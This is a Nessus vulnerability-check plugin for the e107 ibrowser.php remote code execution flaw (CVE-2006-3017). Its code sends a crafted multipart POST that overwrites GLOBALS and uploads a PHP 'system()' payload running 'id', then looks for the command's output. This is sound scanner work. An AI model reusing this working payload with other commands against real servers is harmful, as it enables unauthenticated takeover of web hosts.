#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(22299);
  script_version("$Revision: 1.13 $");

  script_cve_id("CVE-2005-3390", "CVE-2006-3017");
  script_bugtraq_id(15250, 17843);
  script_xref(name:"OSVDB", value:"25255");

  script_name(english:"e107 ibrowser.php zend_has_del() Function Remote Code Execution");
  script_summary(english:"Tries to run a command in e107");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows execution of
arbitrary PHP code." );
 script_set_attribute(attribute:"description", value:
"The 'e107_handlers/tiny_mce/plugins/ibrowser/ibrowser.php' script
included with the version of e107 installed on the remote host
contains a programming flaw that may allow an unauthenticated remote
attacker to execute arbitrary PHP code on the affected host, subject
to the privileges of the web server user id. 

Note that successful exploitation of this issue requires that PHP's
'register_globals' and 'file_uploads' settings be enabled and that the
remote version of PHP be older than 4.4.1 or 5.0.6." );
 script_set_attribute(attribute:"see_also", value:"http://www.hardened-php.net/globals-problem" );
 script_set_attribute(attribute:"see_also", value:"http://www.hardened-php.net/hphp/zend_hash_del_key_or_index_vulnerability.html" );
 script_set_attribute(attribute:"see_also", value:"http://milw0rm.com/exploits/2268" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to PHP version 4.4.3 / 5.1.4 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("e107_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/e107"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Make sure the affected script exists.
  url = string(dir, "/e107_handlers/tiny_mce/plugins/ibrowser/ibrowser.php");
  r = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # If it does...
  if ("alert(tinyMCE.getLang" >< res)
  {
    # Try to exploit the flaw to execute a command.
    #
    # nb: as part of the attack, a scratch file is written on the target; but
    #     PHP removes the file when the request is finished since the target
    #     script doesn't do anything with the upload.
    cmd = "id";
    bound = "bound";
    boundary = string("--", bound);
    postdata = string(
      boundary, "\r\n", 
      'Content-Disposition: form-data; name="GLOBALS"; filename="nessus";', "\r\n",
      "Content-Type: image/jpeg;\r\n",
      "\r\n",
      SCRIPT_NAME, "\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="tinyMCE_imglib_include"; filename="nessus";', "\r\n",
      "Content-Type: text/plain\r\n",
      "\r\n",
      '<?php system(', cmd, ");  ?>\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="-1203709508"; filename="nessus";', "\r\n",
      "Content-Type: text/plain\r\n",
      "\r\n",
      "1\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="225672436"; filename="nessus";', "\r\n",
      "Content-Type: text/plain\r\n",
      "\r\n",
      "1\r\n",

      boundary, "--", "\r\n"
    );

    r = http_send_recv3(method: "POST ",  item: url, version: 11, data: postdata, port:port,
      add_headers: make_array("Content-Type", "multipart/form-data; boundary="+bound ) );
    if (isnull(r)) exit(0);
    res = r[2];

    line = egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res);
    if (line)
    {
      if (report_verbosity < 1) report = desc;
      else report = string(
        "Nessus was able to execute the command 'id' on the remote host,\n",
        "which produced the following output :\n",
        "\n",
        line
      );
      security_hole(port:port, extra:report);
      exit(0);
    }
  }
}
